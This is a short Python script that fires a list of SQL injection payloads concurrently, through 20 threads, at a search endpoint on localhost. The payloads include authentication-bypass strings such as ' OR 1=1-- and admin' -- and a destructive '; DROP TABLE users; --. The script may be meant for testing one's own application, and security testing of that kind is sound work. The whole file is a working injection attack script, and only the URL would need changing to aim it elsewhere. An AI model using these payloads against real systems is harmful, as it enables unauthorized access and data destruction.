import requests 
from concurrent.futures import ThreadPoolExecutor

def run():
    url = "http://127.0.0.1:5000/search"

    sql_injections = ["'; DROP TABLE users; --", "' OR 1=1--", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1#", "' OR 1=1--", "' OR 1=1/*", "admin' --", "admin' #", "admin'/*", "' OR '1'='1' LIMIT 1 --", "' OR '1'='1' LIMIT 1#", "' OR '1'='1' LIMIT 1/*", "' OR '1'='1' ORDER BY 1 --", "' OR '1'='1' ORDER BY 1#", "' OR '1'='1' ORDER BY 1/*    "]

    session = requests.Session()
    with ThreadPoolExecutor(max_workers=20) as executor:
        for injection in sql_injections:
            payload = {"query": injection}
            executor.submit(session.get, url, params={"q": injection})

if __name__ == "__main__":
    run()